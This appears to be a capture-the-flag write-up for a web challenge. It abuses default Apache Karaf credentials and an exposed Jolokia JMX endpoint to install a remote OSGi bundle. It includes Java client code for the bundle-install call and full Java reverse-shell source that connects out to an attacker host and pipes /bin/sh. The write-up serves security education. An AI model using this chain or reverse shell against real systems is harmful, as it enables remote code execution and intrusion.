# Ghost pepper (web, 125p, 78 solved)


In the challenge we get a link to webpage which requests Basic Auth from us.
As a hint the page says `karaf`.

Karaf is OSGi provider, and coincidentally the default user/password for the web interface is `karaf:karaf`.

Now that we passed the authentication, we try to look around, but everything returns 404.

We guessed that maybe the challenge name is some kind of hint.
Ghost pepper is otherwise known as `jolokia`, and this happens to be a name of Java JMX-over-HTTP service.

We confirmed this by checking `/jolokia` endpoint, which returned some data.

Exposing JMX is usually a bad idea because it's always at least some infoleak.
Here we've got OSGi running there as well, and it seems there were some JMX Managed Beans from Karaf exposed as well.

OSGi is a Java platform which allows managing lifecycle of application components at runtime, without the need to restart the app.
You can add/remove/substitute a component at runtime, deploy multiple versions etc, all while the app is running.

From our perspective there is one particularly intersting operation -> installing and starting a new component.

We can list all beans and operations they provide at  `/jolokia/list`.

JMX Bean `org.apache.karaf:name=root,type=bundle` provides `install(java.lang.String, boolean)` operation, where the first argument is URL for the JAR file containing the component, and boolean specifies if it should be automatically started.

We can run this with:

```java
public static void main(String[] args) throws Exception {
    J4pClient j4pClient = J4pClient.url("http://111.186.63.207:31337/jolokia/").user("karaf").password("karaf").build();
    J4pExecRequest req = new J4pExecRequest("org.apache.karaf:name=root,type=bundle", "install(java.lang.String, boolean)", "http://our.url/helloworld-1.0.0.jar", true);
    J4pExecResponse resp = j4pClient.execute(req);
    System.out.println(resp.getValue().toString());
}
```

Now if we provide some interesting component to run, we should get a nice RCE.
We went ahead with some stolen and modified Java Reverse Shell in OSGi bundle format:

```java
public class Activator implements BundleActivator {

    public void start(BundleContext context) {
        try {
            try {
                String host = "our.ip";
                int port = 80;
                Socket s = new Socket(host, port);
                String cmd = "/bin/sh";
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                while (!s.isClosed()) {
                    while (pi.available() > 0)
                        so.write(pi.read());
                    while (pe.available() > 0)
                        so.write(pe.read());
                    while (si.available() > 0)
                        po.write(si.read());
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                }
                p.destroy();
                s.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {

        }
    }

    public void stop(BundleContext context) {
        System.out.println("Goodbye World!");
    }

}
```

One tricky part was that we initially used some random port number, and it didn't work.
We were afraid there is some mitigation in place and we'll need to exfiltrate the flag blindly somehow.
But we realised that they did download the bundle, so at least 80 and 8080 ports are not blacklisted.

Once we get a reverse shell we can read the flag: `flag{DOYOULOVEJOLOKIA?ILOVEITVERYMUCH}`
